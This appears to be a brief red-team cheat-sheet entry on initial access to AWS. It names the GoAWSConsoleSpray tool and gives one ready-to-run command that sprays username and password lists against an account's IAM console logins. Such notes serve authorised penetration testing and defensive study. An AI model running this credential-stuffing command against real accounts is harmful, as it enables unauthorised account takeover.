# Initial Access

## Credential Stuffing

Tools:

1) GoAWSConsoleSpray: https://github.com/WhiteOakSecurity/GoAWSConsoleSpray

### 1) Run the attack against AWS IAM logins

    ./GoAWSConsoleSpray -a AWS_ACCOUNT_ID -u users.txt -p passwords.txt
